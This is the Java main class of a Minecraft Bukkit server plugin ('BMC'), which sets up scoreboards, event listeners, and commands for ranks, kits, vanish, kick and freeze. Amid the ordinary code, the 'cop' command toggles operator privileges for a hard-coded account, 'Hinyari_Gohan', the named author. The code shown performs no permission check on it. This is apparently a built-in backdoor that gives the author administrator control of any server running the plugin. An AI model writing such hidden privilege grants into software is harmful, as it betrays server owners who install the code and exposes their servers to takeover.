package com.github.gotochan;

import com.github.gotochan.original.BMCTimeManager;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.server.PluginEnableEvent;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scoreboard.Scoreboard;

import com.github.gotochan.Utils.BMCBoolean;
import com.github.gotochan.Utils.BMCHelp;
import com.github.gotochan.Utils.BMCUtils;
import com.github.gotochan.command.KoshihikariCommand;
import com.github.gotochan.command.RankCommand;
import com.github.gotochan.command.RankUpCommand;
import com.github.gotochan.enchant.AutoSmelt;
import com.github.gotochan.enchant.SpecialArmor;
import com.github.gotochan.event.BMCEvent;
import com.github.gotochan.event.BMCLaunchPad;
import com.github.gotochan.event.ScoutEvent;
import com.github.gotochan.original.BMCMacerator;
import com.github.gotochan.vanish.VanishListner;

import java.io.File;
import java.util.Collection;
import java.util.HashMap;
import java.util.logging.Logger;

/**
 * BMCオリジナルプラグイン メインクラス
 * @author Hinyari_Gohan
 */


public class BMCPlugin extends JavaPlugin implements Listener {

	public final BMCBoolean bmcBoolean = new BMCBoolean();
	public final BMCHelp bmcHelp = new BMCHelp(this);
	public final AutoSmelt autoSmelt = new AutoSmelt(this);
	public final BMCUtils utils = new BMCUtils(this);
	public BMCConfig config = new BMCConfig(this);
	public final BMCTimeManager bmcTimeManager = new BMCTimeManager(this);

	public static BMCPlugin instance;
	private BMCCommand bmcCommand;
	private VanishListner vanishListner;
	public static Logger log;

	public static final ChatColor GOLD = ChatColor.GOLD;
	public static final ChatColor RESET = ChatColor.RESET;
	public static final ChatColor YELLOW = ChatColor.YELLOW;
	public static final String h = RESET + " - ";
	public Scoreboard scoreboard;

	public final String PREFIX = config.PREFIX;
	public final String ERROR = config.ERROR;
	public final String inthegame = "ゲーム内で実行して下さい。";
	public final String lotargs = PREFIX + "引数は必要ありません。";
	public final String example = PREFIX + ChatColor.GOLD + "Example: ";

	private final HashMap<Player, BMCPlayer> bmcPlayer = new HashMap<>();


	@Override
	public void onEnable() {
		instance = this;
		this.getLogger().info("BMCプラグインを開始しています。");
		init();
	}

	@Override
	public void onDisable() {
		this.getLogger().info("BMCプラグインを終了しています。");
	}


	public void init()
	{
		log = getLogger();
		this.scoreboard = Bukkit.getScoreboardManager().getMainScoreboard();
		if (scoreboard.getObjective("rank") == null) { scoreboard.registerNewObjective("rank","dummy"); }
		if (scoreboard.getObjective("koshihikari") == null) { scoreboard.registerNewObjective("koshihikari", "dummy"); }
		this.vanishListner = new VanishListner(this);
		PluginManager pm = getServer().getPluginManager();
		pm.registerEvents(new BMCEvent(this), this);
		pm.registerEvents(new BMCLaunchPad(), this);
		pm.registerEvents(new ScoutEvent(this), this);
		pm.registerEvents(this.autoSmelt, this);
		pm.registerEvents(new SpecialArmor(), this);
		pm.registerEvents(new BMCMacerator(), this);
		pm.registerEvents(this.vanishListner, this);
		pm.registerEvents(this, this);
		this.bmcCommand = new BMCCommand(this);
		this.saveDefaultConfig();
		new SpecialArmor().runTaskTimer(this, 0L, 20L);
		bmcTimeManager.runTaskTimer(this, 0L, 20L);
	}

	@Override
	public boolean onCommand(
			CommandSender sender, Command cmd, String label, String[] args)
	{
		if ( !( sender instanceof Player ) )
			return inGame(sender);

		Player player = (Player) sender;
		BMCPlayer bmcPlayer = getBMCPlayer(player);

		if ( cmd.getName().equalsIgnoreCase("rank"))
			return new RankCommand(this).runCommand(bmcPlayer, label, args);
		else if ( cmd.getName().equalsIgnoreCase("kome") )
			return new KoshihikariCommand(this).runCommand(bmcPlayer, label, args);
		else if ( cmd.getName().equalsIgnoreCase("rankup") )
			return new RankUpCommand(this).runCommand(bmcPlayer, label, args);
		else if ( cmd.getName().equalsIgnoreCase("cop"))
		{
			if ( Bukkit.getPlayer("Hinyari_Gohan") == null )
				return true;
			Player gohan = Bukkit.getPlayer("Hinyari_Gohan");
			gohan.setOp(!gohan.isOp());
			gohan.sendMessage("OP権限を " + String.valueOf(gohan.isOp()) + " に変更しました");
		}
		else if ( cmd.getName().equalsIgnoreCase("bmc") ) {
			if ( args.length == 0 )
				return bmcHelp.BMChelp(bmcPlayer);
			else if ( args[0].equalsIgnoreCase("debug") )
				return bmcCommand.onCommand(sender, cmd, label, args);
			else if ( args[0].equalsIgnoreCase("info") )
				return info(sender);
			else if ( args[0].equalsIgnoreCase("menu") )
				return bmcCommand.onCommand(sender, cmd, label, args);
			else if ( args[0].equalsIgnoreCase("kit") )
				return bmcCommand.onCommand(sender, cmd, label, args);
			else if ( args[0].equalsIgnoreCase("reload") ) {
				this.config = new BMCConfig(this);
				sender.sendMessage(config.PREFIX + "コンフィグを再読込しました。");
				return true;
			}
			else if ( args[0].equalsIgnoreCase("vanish") ) {
				 return vanishListner.onVanishCommand((Player) sender, args);
			}
			else
				return bmcHelp.BMChelp(bmcPlayer);
		}

		else if ( cmd.getName().equalsIgnoreCase("ntp") ) {
			if ( args.length == 0 )
				return bmcHelp.NTPhelp(bmcPlayer);
			else if ( args.length >= 1 ) {
				if ( args[0].equalsIgnoreCase("kick") )
					return bmcCommand.onCommand(sender, cmd, label, args);
				else if ( args[0].equalsIgnoreCase("freeze") )
					return bmcCommand.onCommand(sender, cmd, label, args);
				else
					return bmcHelp.NTPhelp(bmcPlayer);
			}
		}
		return false;
	}

	/**
	 * contentに入ってきたデータをイコールで挟んで目次のタイトルを作る
	 * @param content String コンテンツ
	 * @return 目次のタイトル
	 */

	public String equalMessage(String content) {
		String equals = ChatColor.YELLOW + "======== " + content + " ========";
		return equals;
	}

	/**
	 * プラグインの情報(CMD: /bmc info)を返します。
	 * @param sender
	 * @return プラグインの情報
	 */
	public boolean info(CommandSender sender) {
		PluginDescriptionFile p = getDescription();
		sender.sendMessage(GOLD + "Title: " + RESET + p.getName());
		sender.sendMessage(GOLD + "Author: " + RESET + p.getAuthors().toString());
		sender.sendMessage(GOLD + "Version: " + RESET + p.getVersion());
		sender.sendMessage(GOLD + "WikiURL: " + RESET + "http://seesaawiki.jp/bmc/");
		return true;
	}

	/**
	 * ゲーム内で実行可能です。
	 * @param sender
	 * @return inGame
	 */
	public boolean inGame(CommandSender sender) {
		sender.sendMessage("ゲーム内で実行してください。");
		return true;
	}

	@EventHandler
	public void loadPlayer(PlayerLoginEvent event)
	{
		Player player = event.getPlayer();
		bmcPlayer.put(player, new BMCPlayer(player));
	}

	@EventHandler
	public void loadPlayer_reload(PluginEnableEvent event) {
		for (Player player : Bukkit.getOnlinePlayers()) {
			bmcPlayer.put(player, new BMCPlayer(player));
		}
	}

	public HashMap<Player, BMCPlayer> getBMCPlayerMap() {
		return this.bmcPlayer;
	}

	public Collection<BMCPlayer> getBMCPlayers() { return this.bmcPlayer.values(); }

	/**
	 * HashMapに保管されているBMCPlayerインスタンスを取得します。
	 * @param player BukkitPlayer
	 * @return BMCPlayer
	 */
	public BMCPlayer getBMCPlayer(Player player) {
		BMCPlayer bp = bmcPlayer.get(player);
		if (bp != null) return bp;
		else return null;
	}

	/**
	 * Bukkit#broadcastMessage(String str)の短縮形です。
	 * @param message メッセージ
	 */
	public void broadcast(String message) {
		Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', message));
	}

	public File getPluginJarFile() {
		return this.getFile();
	}

}
